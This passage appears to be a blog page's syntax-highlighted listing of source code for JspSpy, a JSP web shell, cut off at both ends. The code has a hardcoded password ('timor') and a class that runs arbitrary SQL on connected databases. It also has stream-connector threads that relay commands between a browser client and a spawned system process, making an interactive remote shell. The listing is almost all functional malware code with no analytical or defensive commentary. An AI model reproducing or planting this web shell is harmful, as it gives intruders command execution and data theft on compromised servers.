import=<span class="string">"java.util.regex.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.sql.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.nio.charset.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"javax.servlet.http.HttpServletRequestWrapper"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.text.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.net.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.util.zip.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.awt.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.awt.image.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"javax.imageio.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.awt.datatransfer.DataFlavor"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.util.prefs.Preferences"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%!</span></span><br><span class="line"></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> PW = <span class="string">"timor"</span>; //password</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> PW_SESSION_ATTRIBUTE = <span class="string">"JspSpyPwd"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> REQUEST_CHARSET = <span class="string">"ISO-8859-1"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> PAGE_CHARSET = <span class="string">"UTF-8"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> CURRENT_DIR = <span class="string">"currentdir"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> MSG = <span class="string">"SHOWMSG"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> PORT_MAP = <span class="string">"PMSA"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> DBO = <span class="string">"DBO"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static final <span class="built_in">String</span> SHELL_ONLINE = <span class="string">"SHELL_ONLINE"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="built_in">String</span> SHELL_NAME = <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="built_in">String</span> WEB_ROOT = <span class="literal">null</span>; </span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="built_in">String</span> SHELL_DIR = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static Map&lt;<span class="built_in">String</span>,Invoker&gt; ins = <span class="keyword">new</span> HashMap&lt;<span class="built_in">String</span>,Invoker&gt;();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> MyRequest extends HttpServletRequestWrapper &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> MyRequest(HttpServletRequest req) &#123;</span></span><br><span class="line"><span class="vbscript">super(req);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> <span class="built_in">String</span> getParameter(<span class="built_in">String</span> name) &#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> value = super.getParameter(name);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (name == <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">return <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">return <span class="keyword">new</span> <span class="built_in">String</span>(value.getBytes(REQUEST_CHARSET),PAGE_CHARSET);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">return <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> DBOperator&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> Connection conn = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> Statement stmt = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> driver;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> url;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> uid;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> pwd;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> DBOperator(<span class="built_in">String</span> driver,<span class="built_in">String</span> url,<span class="built_in">String</span> uid,<span class="built_in">String</span> pwd) throws Exception &#123;</span></span><br><span class="line"><span class="vbscript">this(driver,url,uid,pwd,<span class="literal">false</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> DBOperator(<span class="built_in">String</span> driver,<span class="built_in">String</span> url,<span class="built_in">String</span> uid,<span class="built_in">String</span> pwd,boolean connect) throws Exception &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">Class</span>.forName(driver);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (connect)</span></span><br><span class="line"><span class="vbscript">this.conn = DriverManager.getConnection(url,uid,pwd);</span></span><br><span class="line"><span class="vbscript">this.url = url;</span></span><br><span class="line"><span class="vbscript">this.driver = driver;</span></span><br><span class="line"><span class="vbscript">this.uid = uid;</span></span><br><span class="line"><span class="vbscript">this.pwd = pwd;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void connect() throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">this.conn = DriverManager.getConnection(url,uid,pwd);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> Object <span class="keyword">execute</span>(<span class="built_in">String</span> sql) throws Exception &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (isValid()) &#123;</span></span><br><span class="line"><span class="vbscript">stmt = conn.createStatement();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (stmt.<span class="keyword">execute</span>(sql)) &#123;</span></span><br><span class="line"><span class="vbscript">return stmt.getResultSet();</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">return stmt.getUpdateCount();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">throw <span class="keyword">new</span> Exception(<span class="string">"Connection is inValid."</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void closeStmt() throws Exception&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (this.stmt != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">stmt.close();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean isValid() throws Exception &#123;</span></span><br><span class="line"><span class="vbscript">return conn != <span class="literal">null</span> &amp;&amp; !conn.isClosed();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void close() throws Exception &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (isValid()) &#123;</span></span><br><span class="line"><span class="vbscript">closeStmt();</span></span><br><span class="line"><span class="vbscript">conn.close();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean equals(Object o) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (o instanceof DBOperator) &#123;</span></span><br><span class="line"><span class="vbscript">DBOperator dbo = (DBOperator)o;</span></span><br><span class="line"><span class="vbscript">return this.driver.equals(dbo.driver) &amp;&amp; this.url.equals(dbo.url) &amp;&amp; this.uid.equals(dbo.uid) &amp;&amp; this.pwd.equals(dbo.pwd);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">return <span class="literal">false</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> StreamConnector extends Thread &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> InputStream <span class="keyword">is</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> OutputStream os;  </span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> StreamConnector( InputStream <span class="keyword">is</span>, OutputStream os )&#123;</span></span><br><span class="line"><span class="vbscript">this.<span class="keyword">is</span> = <span class="keyword">is</span>;</span></span><br><span class="line"><span class="vbscript">this.os = os;</span></span><br><span class="line"><span class="vbscript">&#125;			  </span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void run()&#123;</span></span><br><span class="line"><span class="vbscript">BufferedReader <span class="keyword">in</span>  = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">BufferedWriter out = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">in</span>  = <span class="keyword">new</span> BufferedReader( <span class="keyword">new</span> InputStreamReader(this.<span class="keyword">is</span>));</span></span><br><span class="line"><span class="vbscript">out = <span class="keyword">new</span> BufferedWriter( <span class="keyword">new</span> OutputStreamWriter(this.os));</span></span><br><span class="line"><span class="vbscript">char buffer[] = <span class="keyword">new</span> char[<span class="number">8192</span>];</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> length;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span>((length = <span class="keyword">in</span>.read( buffer, <span class="number">0</span>, buffer.length ))&gt;<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="vbscript">out.write( buffer, <span class="number">0</span>, length );</span></span><br><span class="line"><span class="vbscript">out.flush();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch(Exception e)&#123;&#125;</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span>(<span class="keyword">in</span> != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript"><span class="keyword">in</span>.close();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span>(out != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">out.close();</span></span><br><span class="line"><span class="vbscript">&#125; catch( Exception e )&#123;&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> OnLineProcess &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> cmd = <span class="string">"first"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> Process pro;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> OnLineProcess(Process p)&#123;</span></span><br><span class="line"><span class="vbscript">this.pro = p;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void setPro(Process p) &#123;</span></span><br><span class="line"><span class="vbscript">this.pro = p;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void setCmd(<span class="built_in">String</span> c)&#123;</span></span><br><span class="line"><span class="vbscript">this.cmd = c;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> <span class="built_in">String</span> getCmd()&#123;</span></span><br><span class="line"><span class="vbscript">return this.cmd;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> Process getPro()&#123;</span></span><br><span class="line"><span class="vbscript">return this.pro;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void <span class="keyword">stop</span>()&#123;</span></span><br><span class="line"><span class="vbscript">this.pro.destroy();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> OnLineConnector extends Thread &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> OnLineProcess ol = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> InputStream <span class="keyword">is</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> OutputStream os;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> name;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> OnLineConnector( InputStream <span class="keyword">is</span>, OutputStream os ,<span class="built_in">String</span> name,OnLineProcess ol)&#123;</span></span><br><span class="line"><span class="vbscript">this.<span class="keyword">is</span> = <span class="keyword">is</span>;</span></span><br><span class="line"><span class="vbscript">this.os = os;</span></span><br><span class="line"><span class="vbscript">this.name = name;</span></span><br><span class="line"><span class="vbscript">this.ol = ol;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void run()&#123;</span></span><br><span class="line"><span class="vbscript">BufferedReader <span class="keyword">in</span>  = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">BufferedWriter out = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">in</span>  = <span class="keyword">new</span> BufferedReader( <span class="keyword">new</span> InputStreamReader(this.<span class="keyword">is</span>));</span></span><br><span class="line"><span class="vbscript">out = <span class="keyword">new</span> BufferedWriter( <span class="keyword">new</span> OutputStreamWriter(this.os));</span></span><br><span class="line"><span class="vbscript">char buffer[] = <span class="keyword">new</span> char[<span class="number">128</span>];</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span>(this.name.equals(<span class="string">"exeRclientO"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">//from exe <span class="keyword">to</span> client</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> length = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span>((length = <span class="keyword">in</span>.read( buffer, <span class="number">0</span>, buffer.length ))&gt;<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> str = <span class="keyword">new</span> <span class="built_in">String</span>(buffer, <span class="number">0</span>, length);</span></span><br><span class="line"><span class="vbscript">str = str.<span class="built_in">replace</span>(<span class="string">"&amp;"</span>,<span class="string">"&amp;amp;"</span>).<span class="built_in">replace</span>(<span class="string">"&lt;"</span>,<span class="string">"&amp;lt;"</span>).<span class="built_in">replace</span>(<span class="string">"&gt;"</span>,<span class="string">"&amp;gt;"</span>);</span></span><br><span class="line"><span class="vbscript">str = str.<span class="built_in">replace</span>(<span class="string">""</span>+(char)<span class="number">13</span>+(char)<span class="number">10</span>,<span class="string">"&lt;br/&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">str = str.<span class="built_in">replace</span>(<span class="string">"\n"</span>,<span class="string">"&lt;br/&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.write(str.toCharArray(), <span class="number">0</span>, str.length());</span></span><br><span class="line"><span class="vbscript">out.flush();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">//from client <span class="keyword">to</span> exe</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span>(this.ol.getCmd() == <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">Thread.sleep(<span class="number">500</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (this.ol.getCmd().equals(<span class="string">"first"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">this.ol.setCmd(<span class="literal">null</span>);</span></span><br><span class="line"><span class="vbscript">continue;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">this.ol.setCmd(this.ol.getCmd() + (char)<span class="number">10</span>);</span></span><br><span class="line"><span class="vbscript">char[] arr = this.ol.getCmd().toCharArray();</span></span><br><span class="line"><span class="vbscript">out.write(arr,<span class="number">0</span>,arr.length);</span></span><br><span class="line"><span class="vbscript">out.flush();</span></span><br><span class="line"><span class="vbscript">this.ol.setCmd(<span class="literal">null</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch(Exception e)&#123;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span>(<span class="keyword">in</span> != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript"><span class="keyword">in</span>.close();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span>(out != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">out.close();</span></span><br><span class="line"><span class="vbscript">&#125; catch( Exception e )&#123;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> Table&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> ArrayList&lt;Row&gt; rows = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> boolean echoTableTag = <span class="literal">false</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void setEchoTableTag(boolean v) &#123;</span></span><br><span class="line"><span class="vbscript">this.echoTableTag = v;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> Table()&#123;</span></span><br><span class="line"><span class="vbscript">this.rows = <span class="keyword">new</span> ArrayList&lt;Row&gt;();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void addRow(Row r) &#123;</span></span><br><span class="line"><span class="vbscript">this.rows.add(r);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> <span class="built_in">String</span> toString()&#123;</span></span><br><span class="line"><span class="vbscript">StringBuilder html = <span class="keyword">new</span> StringBuilder();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (echoTableTag)</span></span><br><span class="line"><span class="vbscript">html.append(<span class="string">"&lt;table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (Row r:rows) &#123;</span></span><br><span class="line"><span class="vbscript">html.append(<span class="string">"&lt;tr class=\"</span>alt1\<span class="string">" onMouseOver=\"</span>this.className=<span class="comment">'focus';\" onMouseOut=\"this.className='alt1';\"&gt;");</span></span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (Column c:r.getColumns()) &#123;</span></span><br><span class="line"><span class="vbscript">html.append(<span class="string">"&lt;td nowrap&gt;"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> vv = Util.htmlEncode(Util.getStr(c.getValue()));</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (vv.equals(<span class="string">""</span>))</span></span><br><span class="line"><span class="vbscript">vv = <span class="string">"&amp;nbsp;"</span>;</span></span><br><span class="line"><span class="vbscript">html.append(vv);</span></span><br><span class="line"><span class="vbscript">html.append(<span class="string">"&lt;/td&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">html.append(<span class="string">"&lt;/tr&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (echoTableTag)</span></span><br><span class="line"><span class="vbscript">html.append(<span class="string">"&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">return html.toString();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> Row&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> ArrayList&lt;Column&gt; cols = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> Row()&#123;</span></span><br><span class="line"><span class="vbscript">this.cols = <span class="keyword">new</span> ArrayList&lt;Column&gt;();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void addColumn(Column n) &#123;</span></span><br><span class="line"><span class="vbscript">this.cols.add(n);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> ArrayList&lt;Column&gt; getColumns()&#123;</span></span><br><span class="line"><span class="vbscript">return this.cols;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> Column&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> value;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> Column(<span class="built_in">String</span> v)&#123;</span></span><br><span class="line"><span class="vbscript">this.value = v;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> <span class="built_in">String</span> getValue()&#123;</span></span><br><span class="line"><span class="vbscript">return this.value;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> Util&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static boolean <span class="built_in">isEmpty</span>(<span class="built_in">String</span> s) &#123;</span></span><br><span class="line"><span class="vbscript">return s == <span class="literal">null</span> || s.<span class="built_in">trim</span>().equals(<span class="string">""</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static boolean <span class="built_in">isEmpty</span>(Object o) &#123;</span></span><br><span class="line"><span class="vbscript">return o == <span class="literal">null</span> || <span class="built_in">isEmpty</span>(o.toString());</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static <span class="built_in">String</span> getSize(long size,char danwei) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (danwei == <span class="comment">'M') &#123;</span></span></span><br><span class="line"><span class="vbscript">double v =  <span class="built_in">formatNumber</span>(size / <span class="number">1024.0</span> / <span class="number">1024.0</span>,<span class="number">2</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (v &gt; <span class="number">1024</span>) &#123;</span></span><br><span class="line"><span class="vbscript">return getSize(size,<span class="comment">'G');</span></span></span><br><span class="line"><span class="vbscript">&#125;<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">return v + <span class="string">"M"</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (danwei == <span class="comment">'G') &#123;</span></span></span><br><span class="line"><span class="vbscript">return <span class="built_in">formatNumber</span>(size / <span class="number">1024.0</span> / <span class="number">1024.0</span> / <span class="number">1024.0</span>,<span class="number">2</span>)+<span class="string">"G"</span>;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (danwei == <span class="comment">'K') &#123;</span></span></span><br><span class="line"><span class="vbscript">double v = <span class="built_in">formatNumber</span>(size / <span class="number">1024.0</span>,<span class="number">2</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (v &gt; <span class="number">1024</span>) &#123;</span></span><br><span class="line"><span class="vbscript">return getSize(size,<span class="comment">'M');</span></span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">return v + <span class="string">"K"</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (danwei == <span class="comment">'B') &#123;</span></span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (size &gt; <span class="number">1024</span>) &#123;</span></span><br><span class="line"><span class="vbscript">return getSize(size,<span class="comment">'K');</span></span></span><br><span class="line"><span class="vbscript">&#125;<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">return size + <span class="string">"B"</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">return <span class="string">""</span>+<span class="number">0</span>+danwei;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static double <span class="built_in">formatNumber</span>(double value,<span class="built_in">int</span> l) &#123;</span></span><br><span class="line"><span class="vbscript">NumberFormat format = NumberFormat.getInstance();</span></span><br><span class="line"><span class="vbscript">format.setMaximumFractionDigits(l);</span></span><br><span class="line"><span class="vbscript">format.setGroupingUsed(<span class="literal">false</span>);</span></span><br><span class="line"><span class="vbscript">return <span class="keyword">new</span> Double(format.format(value));</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static boolean isInteger(<span class="built_in">String</span> v) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (<span class="built_in">isEmpty</span>(v))</span></span><br><span class="line"><span class="vbscript">return <span class="literal">false</span>;</span></span><br><span class="line"><span class="vbscript">return v.matches(<span class="string">"^\\d+$"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static <span class="built_in">String</span> formatDate(long <span class="built_in">time</span>) &#123;</span></span><br><span class="line"><span class="vbscript">SimpleDateFormat format = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd hh:mm:ss"</span>);</span></span><br><span class="line"><span class="vbscript">return format.format(<span class="keyword">new</span> java.util.<span class="built_in">Date</span>(<span class="built_in">time</span>));</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static <span class="built_in">String</span> convertPath(<span class="built_in">String</span> path) &#123;</span></span><br><span class="line"><span class="vbscript">return path != <span class="literal">null</span> ? path.<span class="built_in">replace</span>(<span class="string">"\\"</span>,<span class="string">"/"</span>) : <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static <span class="built_in">String</span> htmlEncode(<span class="built_in">String</span> v) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (<span class="built_in">isEmpty</span>(v))</span></span><br><span class="line"><span class="vbscript">return <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript">return v.<span class="built_in">replace</span>(<span class="string">"&amp;"</span>,<span class="string">"&amp;amp;"</span>).<span class="built_in">replace</span>(<span class="string">"&lt;"</span>,<span class="string">"&amp;lt;"</span>).<span class="built_in">replace</span>(<span class="string">"&gt;"</span>,<span class="string">"&amp;gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static <span class="built_in">String</span> getStr(<span class="built_in">String</span> s) &#123;</span></span><br><span class="line"><span class="vbscript">return s == <span class="literal">null</span> ? <span class="string">""</span> :s;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static <span class="built_in">String</span> getStr(Object s) &#123;</span></span><br><span class="line"><span class="vbscript">return s == <span class="literal">null</span> ? <span class="string">""</span> :s.toString();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static <span class="built_in">String</span> exec(<span class="built_in">String</span> regex, <span class="built_in">String</span> str, <span class="built_in">int</span> group) &#123;</span></span><br><span class="line"><span class="vbscript">Pattern pat = Pattern.compile(regex);</span></span><br><span class="line"><span class="vbscript">Matcher m = pat.matcher(str);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (m.find())</span></span><br><span class="line"><span class="vbscript">return m.group(group);</span></span><br><span class="line"><span class="vbscript">return <span class="literal">null</span>;</span></span><br><span class="line"><span 